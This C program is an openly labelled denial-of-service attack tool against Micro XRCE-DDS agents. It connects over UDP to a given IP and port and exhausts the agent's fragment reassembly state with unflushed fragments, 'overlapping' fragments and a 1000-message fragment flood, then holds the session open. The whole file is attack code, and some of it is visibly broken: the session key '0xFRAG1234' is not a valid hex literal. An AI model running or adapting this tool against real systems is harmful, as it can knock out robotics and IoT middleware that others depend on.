// Compile: gcc attack_fragment_abuse.c -o fragment_abuse -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define STREAM_HISTORY 4
#define SMALL_BUFFER_SIZE 100 * STREAM_HISTORY  // Force fragmentation
#define HUGE_MESSAGE_SIZE 65000

void send_incomplete_fragments(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Sending incomplete fragments...\n");
    
    // Create huge message that will be fragmented
    uint8_t huge_data[HUGE_MESSAGE_SIZE];
    memset(huge_data, 'F', HUGE_MESSAGE_SIZE);
    
    ucdrBuffer ub;
    ucdr_init_buffer(&ub, huge_data, sizeof(huge_data));
    
    // Serialize massive string
    char* huge_string = (char*)malloc(HUGE_MESSAGE_SIZE - 100);
    memset(huge_string, 'X', HUGE_MESSAGE_SIZE - 100);
    huge_string[HUGE_MESSAGE_SIZE - 101] = '\0';
    
    ucdr_serialize_string(&ub, huge_string);
    free(huge_string);
    
    // Send the huge message (will be fragmented)
    uxr_buffer_request_data(session, stream, datawriter,
                           ucdr_buffer_get_buffer_pointer(&ub),
                           HUGE_MESSAGE_SIZE);
    
    // DON'T call uxr_run_session - leave fragments incomplete
    printf("[+] Incomplete fragments sent (not flushed)\n");
}

void send_overlapping_fragments(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter) {
    printf("[*] Attempting overlapping fragment attack...\n");
    
    for (int i = 0; i < 10; i++) {
        uint8_t data[HUGE_MESSAGE_SIZE / 2];
        memset(data, 'O', sizeof(data));
        
        ucdrBuffer ub;
        ucdr_init_buffer(&ub, data, sizeof(data));
        
        char msg[HUGE_MESSAGE_SIZE / 2 - 100];
        snprintf(msg, sizeof(msg), "OVERLAPPING_FRAGMENT_%d", i);
        ucdr_serialize_string(&ub, msg);
        
        uxr_buffer_request_data(session, stream, datawriter, data, sizeof(data));
        
        // Partially flush to create fragment confusion
        if (i % 3 == 0) {
            uxr_run_session_time(session, 10);
        }
    }
    
    printf("[+] Overlapping fragments sent\n");
}

void flood_with_fragments(uxrSession* session, uxrStreamId stream, uxrObjectId datawriter, int count) {
    printf("[*] Flooding with %d fragmented messages...\n", count);
    
    for (int i = 0; i < count; i++) {
        uint8_t large_data[HUGE_MESSAGE_SIZE / 4];
        memset(large_data, 'L' + (i % 26), sizeof(large_data));
        
        ucdrBuffer ub;
        ucdr_init_buffer(&ub, large_data, sizeof(large_data));
        
        char msg[1000];
        snprintf(msg, sizeof(msg), "FLOOD_MESSAGE_%d_START", i);
        for (int j = 0; j < 50; j++) {
            ucdr_serialize_string(&ub, msg);
        }
        
        uxr_buffer_request_data(session, stream, datawriter, large_data, sizeof(large_data));
        
        if (i % 10 == 0) {
            printf("[+] Sent %d fragmented messages\n", i);
        }
        
        usleep(1000); // 1ms between floods
    }
    
    printf("[+] Fragment flood completed\n");
}

int main(int argc, char** argv) {
    if (argc != 3) {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }
    
    char* ip = argv[1];
    char* port = argv[2];
    
    printf("=== Fragmentation Abuse Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);
    
    // Initialize transport
    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port)) {
        printf("[-] Failed to init transport\n");
        return 1;
    }
    
    // Create session
    uxrSession session;
    uxr_init_session(&session, &transport.comm, 0xFRAG1234);
    
    if (!uxr_create_session(&session)) {
        printf("[-] Failed to create session\n");
        return 1;
    }
    
    printf("[+] Session created\n");
    
    // Create small buffer to force fragmentation
    uint8_t output_buffer[SMALL_BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer,
                                                                  SMALL_BUFFER_SIZE, STREAM_HISTORY);
    
    uint8_t input_buffer[SMALL_BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, SMALL_BUFFER_SIZE, STREAM_HISTORY);
    
    // Create entities
    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char* participant_xml = "<dds><participant><rtps><name>fragment_attacker</name></rtps></participant></dds>";
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, participant_xml, UXR_REPLACE);
    
    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char* topic_xml = "<dds><topic><name>FragTopic</name><dataType>string</dataType></topic></dds>";
    uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, topic_xml, UXR_REPLACE);
    
    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, "", UXR_REPLACE);
    
    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    uxrQoS_t qos = {
        .durability = UXR_DURABILITY_VOLATILE,
        .reliability = UXR_RELIABILITY_RELIABLE,
        .history = UXR_HISTORY_KEEP_LAST,
        .depth = 100
    };
    uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id,
                                     topic_id, "", qos, UXR_REPLACE);
    
    printf("[*] Waiting for entity creation...\n");
    uxr_run_session_until_confirm_delivery(&session, 2000);
    
    // Launch fragmentation attacks
    printf("\n[*] Starting fragmentation attacks...\n\n");
    
    // Attack 1: Incomplete fragments
    for (int i = 0; i < 50; i++) {
        send_incomplete_fragments(&session, reliable_out, datawriter_id);
        usleep(100000);
    }
    
    // Attack 2: Overlapping fragments
    for (int i = 0; i < 20; i++) {
        send_overlapping_fragments(&session, reliable_out, datawriter_id);
        usleep(500000);
    }
    
    // Attack 3: Fragment flood
    flood_with_fragments(&session, reliable_out, datawriter_id, 1000);
    
    printf("\n[*] Keeping session alive to maintain fragmentation state...\n");
    uxr_run_session_time(&session, 60000);
    
    printf("\n[*] Attack completed\n");
    
    // Cleanup (fragments remain incomplete in agent)
    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);
    
    return 0;
}